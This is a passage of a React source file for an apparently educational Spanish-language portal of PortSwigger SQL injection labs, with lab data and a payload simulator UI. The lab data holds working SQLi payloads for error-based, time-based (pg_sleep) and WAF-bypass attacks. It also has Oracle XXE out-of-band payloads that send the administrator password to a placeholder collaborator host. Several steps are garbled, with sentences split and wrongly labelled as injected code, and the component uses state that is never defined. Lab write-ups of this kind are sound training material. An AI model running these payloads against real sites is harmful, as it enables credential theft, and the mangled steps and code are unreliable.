                code: "operador de comparació: “AND 1=CAST((SELECT 1) AS int)--.”"
            },
            {
                title: "Paso 20",
                text: "Al ejecutarla nos podremos dar cuenta que no arroja ningún error, por lo que la consulta SQL ahora tendrá la sintáxis correcta. Ahora, para la inyección, adaptaremos un SELECT genérico para que recupere los",
                code: ""
            },
            {
                title: "Paso 23",
                text: "Se inyecta el siguiente código:",
                code: "nombres de usuario de la base de datos: “AND 1=CAST((SELECT username FROM"
            },
            {
                title: "Paso 24",
                text: "users) AS int)--”. Obtendremos un error de nuevo. Nuestra consulta parece haberse truncado por el límite de caracteres permitido. Como resultado, los caracteres que añadimos para comentar la consulta (“--”) se ignoraron. Para solucionar esto, eliminaremos el contenido original de la cookie, para, de esta manera, liberar algunos caracteres,",
                code: ""
            },
            {
                title: "Paso 29",
                text: "Se inyecta el siguiente código:",
                code: "quedándonos solo como “TrackingId=' AND 1=CAST((SELECT username FROM users)"
            },
            {
                title: "Paso 30",
                text: "AS int)--”. Observamos que recibimos un nuevo mensaje de error, que parece haber sido generado por la base de datos. Esto sugiere que la consulta se ejecutó correctamente, pero sigue recibiendo un error porque la consulta devolvió más de una fila. La",
                code: ""
            },
            {
                title: "Paso 34",
                text: "Se inyecta el siguiente código:",
                code: "modificaremos para que solo regrese una sola columna: “TrackingId=' AND"
            },
            {
                title: "Paso 35",
                text: "Se inyecta el siguiente código:",
                code: "1=CAST((SELECT username FROM users LIMIT 1) AS int)--”."
            },
            {
                title: "Paso 36",
                text: "Ya enviada la consulta, sabremos que el primer usuario en nuestra tabla es “administrator”. Ahora modificaremos la consulta para que nos muestre la contraseña:",
                code: ""
            },
            {
                title: "Paso 38",
                text: "Se inyecta el siguiente código:",
                code: "“TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--”."
            },
            {
                title: "Paso 39",
                text: "La contraseña se ha filtrado, siendo “n0qruhn61643ghsw146z”. Ahora podremos iniciar sesión con el usuario administrador y su contraseña, y de esta manera, completar el laboratorio.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P15_img64.png",
            "parcial2/act08_images/P15_img65.png",
            "parcial2/act08_images/P16_img68.png",
            "parcial2/act08_images/P16_img69.png",
        ]
    },
    {
        id: 14,
        title: "Blind SQL injection with time delays",
        type: "Blind (Time)",
        level: "Practitioner",
        payload: "x'%3bSELECT+pg_sleep(10)--",
        description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.",
        objective: "Explotar la vulnerabilidad para pausar la ejecución de la  consulta y provocar un retraso de 10 segundos en la respuesta de la aplicación.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "A diferencia de otros tipos de SQLi, en este caso el servidor ha  sido configurado para no mostrar diferencias visuales si la consulta falla o tiene éxito.  La lógica de ataque se basa en lo siguiente:  ●​ Inyección en la Cookie: Al igual que en el caso anterior, el punto de entrada es  la tracking cookie. El servidor ejecuta la consulta de forma síncrona, lo que  significa que la página web no terminará de cargar hasta que la base de datos  termine su proceso.  ●​ Uso de Funciones de Tiempo: El atacante inserta comandos que obligan a la  base de datos a \"esperar\". Dependiendo del motor de base de datos  (PostgreSQL, MySQL, Microsoft SQL Server), se utilizan funciones como:  ○​ pg_sleep(10)  ○​ WAITFOR DELAY '0:0:10'  ○​ SLEEP(10)  ●​ Confirmación de Vulnerabilidad: Si al enviar la cookie modificada la página  tarda exactamente 10 segundos adicionales en cargar, se confirma que el código  inyectado fue ejecutado por el motor de base de datos.  ●​ Extracción de Datos (Teórica): Aunque el objetivo aquí es solo el retraso, esta  técnica permite extraer información mediante condiciones: \"Si la primera letra de  la contraseña es 'A', espera 10 segundos; si no, responde de inmediato\".",
        impact: "endada:  Dado que aquí no hay errores visibles, la mitigación se centra en evitar que el atacante  pueda \"comunicarse\" con la base de datos a través del tiempo de respuesta.  ●​ Uso estricto de ORMs o Sentencias Preparadas: Al igual que en el caso  anterior, usar herramientas como Entity Framework, Hibernate o PDO (con  parámetros) evita que comandos como pg_sleep() o WAITFOR DELAY sean  interpretados por la base de datos.  ●​ Limitación de Privilegios (Least Privilege): El usuario de la base de datos que  utiliza la aplicación web no debería tener permisos para ejecutar funciones de  sistema o de administración (como comandos de pausa o apagado) si no son  estrictamente necesarios para su función.  ●​ Web Application Firewall (WAF): Un WAF puede detectar patrones  sospechosos en las cookies, como palabras clave de SQL (SELECT, SLEEP,  UNION), y bloquear la solicitud antes de que llegue a la base de datos.  ●​ Timeouts en Consultas: Configurar un tiempo de espera máximo (timeout) para  las consultas en la base de datos. Si una consulta de una cookie tarda más de lo  normal (por ejemplo, más de 1 segundo), la conexión debe cortarse  automáticamente.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Accederemos a la instancia de la práctica utilizando BurpSuite (sin interceptar). Iremos",
                code: ""
            },
            {
                title: "Paso 2",
                text: "Se inyecta el siguiente código:",
                code: "a HTML History y buscaremos aquella petición que contenga la Cookie “TrackingId”, y"
            },
            {
                title: "Paso 3",
                text: "la envíamos al repetidor.",
                code: ""
            },
            {
                title: "Paso 4",
                text: "Se inyecta el siguiente código:",
                code: "Dentro del repetidor, cambiaremos el contenido de TrackingId por"
            },
            {
                title: "Paso 5",
                text: "Se inyecta el siguiente código:",
                code: "“TrackingId=x'||pg_sleep(10)--” y enviaremos la solicitud. Al enviarla, podremos ver"
            },
            {
                title: "Paso 6",
                text: "cómo tardará 10 segundos en cargarla. Una vez cargada la solicitud, el laboratorio aparecerá como completado.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P15_img64.png",
            "parcial2/act08_images/P15_img65.png",
            "parcial2/act08_images/P16_img68.png",
            "parcial2/act08_images/P16_img69.png",
        ]
    },
    {
        id: 15,
        title: "Blind SQL injection with time delays and information retrieval",
        type: "Blind (Time)",
        level: "Practitioner",
        payload: "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
        description: "Comprobaciones algorítmicas demoradas como túnel lateral cronometrado avanzado de robo.",
        objective: "●​ Determinar la longitud de la contraseña del usuario administrator.  ●​ Extraer cada carácter de dicha contraseña mediante ataques de fuerza bruta  basados en tiempo.  ●​ Iniciar sesión en la cuenta del administrador para resolver el laboratorio.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo Blind (Time).",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P16_img68.png",
            "parcial2/act08_images/P16_img69.png",
            "parcial2/act08_images/P17_img72.png",
            "parcial2/act08_images/P17_img73.png",
        ]
    },
    {
        id: 16,
        title: "Blind SQL injection with out-of-band interaction",
        type: "OAST",
        level: "Practitioner",
        payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
        description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.",
        objective: "Explotar la vulnerabilidad de inyección SQL para forzar una  consulta DNS hacia el servidor de Burp Collaborator.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "de la Vulnerabilidad: La aplicación utiliza una cookie de rastreo  (TrackingId) que es procesada por la base de datos de forma asíncrona. Debido a esto,  la aplicación no devuelve errores ni cambios en el contenido de la página (Blind). Sin  embargo, la base de datos (Oracle) permite el uso de funciones como  EXTRACTVALUE y xmltype que pueden ser manipuladas para realizar peticiones de  red externas (Out-of-band). Al inyectar un ataque de XXE dentro del SQLi, obligamos al  servidor a interactuar con un dominio externo controlado por el atacante.",
        impact: "endada  ●​ Uso de Sentencias Preparadas (Prepared Statements): Es la defensa más  efectiva. Al usar consultas parametrizadas, la base de datos trata el contenido  de la cookie TrackingId como simple texto y no como código ejecutable.  ●​ Validación y Saneamiento de Entradas: Implementar filtros que verifiquen que  las cookies solo contengan caracteres alfanuméricos esperados, rechazando  cualquier petición que incluya palabras clave de SQL como SELECT o UNION.  ●​ Hardening de la Base de Datos: Configurar el motor de la base de datos  (Oracle) para que el usuario de la aplicación no tenga permisos de realizar  peticiones de red externas o ejecutar funciones XML innecesarias.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Intercepción: Abrir el navegador integrado de Burp Suite, acceder al laboratorio y capturar la petición GET inicial para enviarla al Repeater.",
                code: ""
            },
            {
                title: "Paso 3",
                text: "Se inyecta el siguiente código:",
                code: "●​ Identificación del Vector: Se localiza la cookie TrackingId como el punto de"
            },
            {
                title: "Paso 4",
                text: "entrada. Al ser una base de datos Oracle, se selecciona un payload que combine SQLi con una entidad externa XML. Configuración del Atacante: En una auditoría profesional, se generaría un subdominio único en la pestaña de Burp Collaborator. Para efectos de este reporte técnico, se utiliza el marcador de posición BURP-COLLABORATOR-SUBDOMAIN.",
                code: ""
            },
            {
                title: "Paso 10",
                text: "Se inyecta el siguiente código:",
                code: "●​ Payload: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml"
            },
            {
                title: "Paso 11",
                text: "version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual-- Codificación: El payload se debe codificar en formato URL (URL Encoding) para asegurar que los caracteres especiales como < y > sean procesados correctamente por el servidor web. Ejecución: Se envía la petición modificada desde el Repeater. El servidor procesa la cookie, ejecuta la consulta SQL y, al intentar resolver el XML, la base de datos realiza una petición DNS al dominio del atacante. Resultado: En el servidor de Burp Collaborator se recibiría un \"DNS lookup\", lo cual confirma la existencia de la vulnerabilidad y la capacidad de ejecutar comandos que interactúan con sistemas externos. Para esta primera parte tenemos que ir a estas dos opciones, “Proxy” y despues a “intercept”. abrimos el browser y pegamos la url del lab encendemos la opcion intercept on Interceptamos algunas señales después de refrescar la página. En esta parte del panel izquierdo, básicamente hice el copy-paste del payload que",
                code: ""
            },
            {
                title: "Paso 29",
                text: "Se inyecta el siguiente código:",
                code: "preparé para la inyección. Lo pegué directamente en la cookie TrackingId porque es el"
            },
            {
                title: "Paso 30",
                text: "único campo que la aplicación rastrea. Como el payload tiene símbolos raros (brackets, comillas, etc.), seleccioné todo el texto y le di Ctrl + U. Eso hizo que Burp lo codifica automáticamente a formato URL, que es como el servidor lo necesita para entenderlo sin marcar error. Después, solo le di al botón de 'Send' para lanzar el ataque al servidor En la captura se observa que, tras inyectar el payload de interacción OAST en la cookie",
                code: ""
            },
            {
                title: "Paso 36",
                text: "Se inyecta el siguiente código:",
                code: "TrackingId y aplicar codificación URL, el servidor responde con un estado 200 OK. Esto"
            },
            {
                title: "Paso 37",
                text: "demuestra que la vulnerabilidad existe, ya que el sistema procesó una lógica de consulta no autorizada que involucra funciones de red de la base de datos (Oracle), confirmando la capacidad de provocar interacciones con servidores externos. Confirmación de x' UNION SELECT...: Se utiliza la comilla simple para romper la cadena original  de la consulta SQL y el comando UNION para inyectar nuestra propia sentencia  personalizada.  ●​ EXTRACTVALUE(): Es una función de Oracle que busca extraer datos de un  XML. Aquí se usa como \"disparador\" para forzar a la base de datos a realizar  una acción externa.  ●​ xmltype(): Crea un documento XML dentro de la base de datos que contiene la  instrucción de buscar una entidad en un servidor externo.  ●​ http://BURP-COLLABORATOR-SUBDOMAIN/: Es la dirección del atacante. Al  intentar resolver este dominio para cargar el XML, el servidor revela que es  vulnerable.  ●​ --: Estos guiones sirven para comentar el resto de la consulta original de la  aplicación, evitando que el servidor marque un error de sintaxis y asegurando  que nuestra inyección se ejecute limpiamente.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P17_img72.png",
            "parcial2/act08_images/P17_img73.png",
            "parcial2/act08_images/P19_img78.png",
        ]
    },
    {
        id: 17,
        title: "Blind SQL injection with out-of-band data exfiltration",
        type: "OAST",
        level: "Practitioner",
        payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
        description: "Colusión DNS maliciosa avanzada filtrando data vía resolución TLD de DNS CNAME.",
        objective: "El objetivo principal es explotar una vulnerabilidad de inyección SQL \"ciega\" para  extraer (exfiltrar) información sensible —específicamente la contraseña del usuario  administrator— de la tabla users. Dado que la aplicación no refleja datos ni errores en  la interfaz web, se debe forzar a la base de datos a realizar una petición externa que  lleve consigo el dato robado.",
        analysis: "de la Vulnerabilidad  La vulnerabilidad reside en la cookie de rastreo TrackingId, la cual es procesada por la  base de datos para realizar consultas analíticas de forma asíncrona. Al ser una base de  datos Oracle, permite el uso de funciones XML para interactuar con sistemas externos.  La técnica aplicada es OAST (Out-of-band Application Security Testing). Se utiliza la  función EXTRACTVALUE junto con xmltype para generar una petición DNS maliciosa.  La clave de este ejercicio es la concatenación de datos: se utiliza el operador || de  Oracle para unir el resultado de una subconsulta SQL (la contraseña del administrador)  con un nombre de dominio controlado por el atacante.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo OAST.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P19_img78.png",
            "parcial2/act08_images/P20_img81.png",
            "parcial2/act08_images/P20_img82.png",
        ]
    },
    {
        id: 18,
        title: "SQL injection with filter bypass via XML encoding",
        type: "Filter Bypass",
        level: "Practitioner",
        payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+",
        description: "Evasión y ofuscación pura contra WAF empresariales abusando de decodificadores internos de XML o JSON.",
        objective: "El objetivo consiste en vulnerar la consulta SQL que procesa el stock de productos para  extraer las credenciales del usuario administrator. Para lograrlo, es necesario evadir la  seguridad del WAF y realizar una inyección basada en UNION que concatene el  nombre de usuario y la contraseña de la tabla users en una sola columna de respuesta.",
        analysis: "de la Vulnerabilidad  La vulnerabilidad se localiza en la etiqueta <storeId> del documento XML enviado al  servidor. El servidor toma el valor numérico de esta etiqueta y lo inserta directamente  en una consulta SQL sin la debida sanitización.  Para evadir el WAF, aprovechamos una característica del procesamiento de  documentos XML: el XML Parser. Cuando el servidor recibe el XML, primero decodifica  cualquier entidad presente (como caracteres en formato hexadecimal) antes de pasar  el valor final a la lógica de la aplicación y a la base de datos. Al enviar las palabras  clave del ataque codificadas (por ejemplo, usando &#x53; en lugar de S), el WAF ve  una cadena de texto inofensiva y permite el paso de la petición, pero la base de datos  acaba ejecutando el comando SQL completo una vez decodificado.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo Filter Bypass.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P19_img78.png",
            "parcial2/act08_images/P20_img81.png",
            "parcial2/act08_images/P20_img82.png",
        ]
    }
];

const getIconForType = (type) => {
    switch (type) {
        case "In-band": return <FaCode className="text-blue-400" />;
        case "UNION-based": return <FaDatabase className="text-purple-400" />;
        case "Blind": return <FaEyeSlash className="text-red-400" />;
        case "Blind (Time)": return <FaClock className="text-yellow-400" />;
        case "Error-based": return <FaExclamationTriangle className="text-orange-400" />;
        case "OAST": return <FaWifi className="text-green-400" />;
        case "Filter Bypass": return <FaShieldAlt className="text-cyan-400" />;
        default: return <FaServer />;
    }
};

const SQLInjectionLabs = () => {
    const [activeLabId, setActiveLabId] = useState(1);
    const activeLab = labsData.find(lab => lab.id === activeLabId);

    return (
        <div className="flex flex-col lg:flex-row gap-0 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl font-sans items-start relative pb-6 lg:pb-0">

            {/* Sidebar Navigation (Sticky) */}
            <div className="lg:w-1/3 w-full bg-[#05080f] border-b lg:border-b-0 lg:border-r border-gray-800 flex flex-col h-[400px] lg:h-[calc(100vh-8rem)] lg:sticky lg:top-24 rounded-tl-xl lg:rounded-l-xl lg:rounded-tr-none z-10 shadow-2xl">
                <div className="p-4 border-b border-gray-800 bg-black/40">
                    <h3 className="text-green-500 font-mono font-bold tracking-widest text-sm flex items-center gap-2">
                        <FaServer /> PORTAL DE LABORATORIOS
                    </h3>
                    <p className="text-xs text-gray-500 mt-1">Selecciona un modelo de explotación para analizar su arquitectura e impacto correspondiente.</p>
                </div>

                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1">
                    {labsData.map((lab) => (
                        <button
                            key={lab.id}
                            onClick={() => handleLabChange(lab.id)}
                            className={`w-full text-left p-3 rounded-lg transition-all duration-300 border relative overflow-hidden group ${activeLabId === lab.id
                                ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_15px_rgba(34,197,94,0.15)] ring-1 ring-green-500/30'
                                : 'border-transparent text-gray-400 hover:bg-gray-800/60 hover:text-gray-200'
                                }`}
                        >
                            {/* Animated indicator for active state */}
                            {activeLabId === lab.id && (
                                <motion.div layoutId="activeLabIndicator" className="absolute left-0 top-0 w-1 h-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.8)]" />
                            )}

                            <div className="flex items-center justify-between mb-1">
                                <span className={`font-mono text-sm md:text-base font-bold w-6 h-6 rounded flex items-center justify-center border transition-colors ${activeLabId === lab.id ? 'bg-green-900/50 border-green-500/50 text-green-400' : 'bg-black/50 border-gray-700'
                                    }`}>
                                    {String(lab.id).padStart(2, '0')}
                                </span>
                                <span className={`text-[9px] px-2 py-0.5 rounded uppercase font-bold tracking-wider ${lab.level === 'Apprentice' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'
                                    }`}>
                                    {lab.level}
                                </span>
                            </div>

                            <div className="flex items-center gap-2 mt-2">
                                <div className="p-1.5 bg-black/40 rounded border border-gray-800 group-hover:border-gray-600 transition-colors">
                                    {getIconForType(lab.type)}
                                </div>
                                <p className="text-xs truncate font-medium flex-1 group-hover:text-white transition-colors">{lab.type}</p>
                                {activeLabId !== lab.id && <FaChevronRight className="text-gray-600 group-hover:text-green-500 transition-colors opacity-0 group-hover:opacity-100 transform translate-x-[-10px] group-hover:translate-x-0" />}
                            </div>
                        </button>
                    ))}
                </div>
            </div>

            {/* Main Content Area */}
            <div className="lg:w-2/3 p-6 lg:p-10 relative flex flex-col min-h-full">
                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeLab.id}
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        transition={{ duration: 0.3 }}
                        className="flex-1 flex flex-col h-full"
                    >
                        {/* Header */}
                        <div className="mb-6 pb-4 border-b border-gray-800">
                            <div className="flex items-center gap-3 mb-4">
                                <span className="bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 text-xs font-mono rounded-full uppercase tracking-wider shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                                    {activeLab.type}
                                </span>
                                <span className="bg-gray-800 text-gray-300 px-3 py-1 text-xs font-mono rounded-full">
                                    LAB #{String(activeLab.id).padStart(2, '0')}
                                </span>
                            </div>
                            <h2 className="text-xl lg:text-2xl font-bold text-white leading-tight mb-2">
                                {activeLab.title}
                            </h2>
                            <p className="text-gray-400 text-sm italic font-mono mb-4">
                                - {activeLab.description}
                            </p>
                        </div>

                        {/* Informative Grid */}
                        <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto mb-6">
                            <div className="bg-blue-900/10 border border-blue-900/30 p-4 rounded-lg">
                                <h4 className="text-blue-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaCheckCircle /> Objetivo del Ataque
                                </h4>
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                    {activeLab.objective}
                                </p>
                            </div>
                            <div className="bg-red-900/10 border border-red-900/30 p-4 rounded-lg">
                                <h4 className="text-red-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaExclamationTriangle /> Análisis de Impacto
                                </h4>
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                    {activeLab.impact}
                                </p>
                            </div>
                        </div>

                        {/* Evidence Gallery (if available) */}
                        {activeLab.images && (
                            <div className="mb-6 p-4 border border-violet-500/20 bg-violet-900/10 rounded-lg">
                                <h4 className="text-violet-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
                                    EJECUCIÓN DEL LABORATORIO & EVIDENCIA VISUAL
                                </h4>
                                <div className="flex flex-col gap-6 w-5/6 max-w-3xl mx-auto">
                                    {activeLab.images.map((imgSrc, idx) => (
                                        <div key={idx} className="relative group overflow-hidden rounded border border-gray-700 hover:border-violet-500 transition-colors">
                                            <div className="absolute top-0 left-0 bg-violet-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded-br z-10">Paso {idx + 1}</div>
                                            <img src={`${import.meta.env.BASE_URL}${imgSrc}`} alt={`Evidencia Lab ${activeLab.id} Paso ${idx + 1}`} className="w-full h-auto object-cover transform transition-transform duration-500 group-hover:scale-105" />
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Interactive Simulation Sandbox */}
                        <div className="flex-none bg-[#0a0a0a] rounded-xl border border-gray-800 overflow-hidden flex flex-col font-sans shadow-2xl relative mb-8">
                            {/* Browser/System Header */}
                            <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <div className="flex gap-1.5 mr-2">
                                        <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                    </div>
                                    <div className="bg-gray-800 text-gray-400 text-[10px] md:text-xs px-3 py-1 rounded-md ml-2 font-mono flex items-center gap-2">
                                        <FaServer />
                                        {activeLab.id === 2 ? "https://portswigger.net/login" : 
                                         activeLab.id === 18 ? "https://portswigger.net/api/stock" : 
                                         "https://portswigger.net/filter?category="}
                                    </div>
                                </div>
                                <span className="text-gray-500 text-[9px] md:text-[10px] uppercase font-bold tracking-widest flex items-center gap-1">
                                    <FaBug /> TARGET SIMULATOR
                                </span>
                            </div>

                            {/* Simulation Body */}
                            <div className="p-5 md:p-8 flex-none space-y-4">
                                
                                {/* URL Parameter Context */}
                                {(![2, 11, 12, 13, 14, 15, 16, 17, 18].includes(activeLab.id)) && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en Parámetro GET (URL)</p>
                                        <div className="flex items-center bg-black border border-gray-700 rounded-lg overflow-hidden focus-within:border-blue-500 transition-colors">
                                            <span className="text-gray-500 font-mono text-xs md:text-sm pl-4 pr-1 bg-gray-900/50 py-3 border-r border-gray-800">?category=</span>
                                            <input 
                                                type="text" 
                                                value={inputValue !== '' ? inputValue : activeLab.payload}
                                                onChange={(e) => setInputValue(e.target.value)}
                                                className="w-full bg-transparent text-blue-400 px-3 py-3 focus:outline-none font-mono text-sm"
                                                onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                            />
                                        </div>
                                    </div>
                                )}

                                {/* Login Context */}
                                {activeLab.id === 2 && (
                                    <div className="flex flex-col gap-3 max-w-sm mx-auto bg-gray-900/40 p-6 rounded-xl border border-gray-800">
                                        <h3 className="text-white text-lg font-bold text-center mb-2">Account Login</h3>
                                        <div className="space-y-4">
                                            <div>
                                                <label className="text-xs text-gray-400 mb-1 block">Username</label>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="w-full bg-black border border-gray-700 text-green-400 px-4 py-2.5 rounded focus:outline-none focus:border-green-500 font-mono text-sm"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                            </div>
                                            <div>
                                                <label className="text-xs text-gray-400 mb-1 block">Password</label>
                                                <input 
                                                    type="password" 
                                                    value="********"
                                                    readOnly
                                                    className="w-full bg-black/50 border border-gray-800 text-gray-500 px-4 py-2.5 rounded focus:outline-none font-mono text-sm cursor-not-allowed"
                                                />
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {/* Cookie Context */}
                                {[11, 12, 13, 14, 15, 16, 17].includes(activeLab.id) && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en Cabecera HTTP (Cookie)</p>
                                        <div className="bg-black border border-gray-700 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300">
                                            <div><span className="text-purple-400">GET</span> / HTTP/1.1</div>
                                            <div><span className="text-blue-400">Host:</span> target.com</div>
                                            <div className="flex items-center mt-2 pt-2 border-t border-gray-800">
                                                <span className="text-yellow-400 mr-2 whitespace-nowrap">Cookie: TrackingId=</span>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="w-full bg-gray-900 border border-gray-700 text-green-400 px-2 py-1 rounded focus:outline-none focus:border-green-500 font-mono"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {/* XML Context */}
                                {activeLab.id === 18 && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en XML Body (POST)</p>
                                        <div className="bg-black border border-gray-700 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300">
                                            <div className="text-pink-400 mb-2">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div>
                                            <div>&lt;stockCheck&gt;</div>
                                            <div className="pl-4 flex items-center my-1">
                                                <span>&lt;storeId&gt;</span>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="flex-1 mx-2 bg-gray-900 border border-gray-700 text-green-400 px-2 py-1 rounded focus:outline-none focus:border-green-500 font-mono min-w-[200px]"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                                <span>&lt;/storeId&gt;</span>
                                            </div>
                                            <div>&lt;/stockCheck&gt;</div>
                                        </div>
                                    </div>
                                )}

                                <div className="flex justify-end mt-4">
                                    <button 
                                        onClick={() => setSimulated(true)}
                                        className="bg-blue-600 hover:bg-blue-500 text-white px-8 py-2.5 rounded-lg font-bold transition-all shadow-[0_0_15px_rgba(37,99,235,0.3)] hover:shadow-[0_0_20px_rgba(37,99,235,0.5)] text-sm uppercase tracking-wide flex items-center gap-2"
                                    >
                                        <FaTerminal /> Enviar Petición
                                    </button>
                                </div>

                                <AnimatePresence>
                                    {simulated && (
                                        <motion.div 
                                            initial={{ height: 0, opacity: 0, y: -10 }}
                                            animate={{ height: "auto", opacity: 1, y: 0 }}
                                            exit={{ height: 0, opacity: 0 }}
                                            className="border-l-4 border-red-500 pl-4 py-4 bg-[#0a0505] mt-6 rounded-r relative overflow-hidden"
                                        >
                                            <div className="absolute top-0 right-0 w-32 h-32 bg-red-500/5 blur-3xl rounded-full"></div>
                                            <div className="text-red-500 font-bold mb-3 flex items-center gap-2 text-sm uppercase tracking-wider">
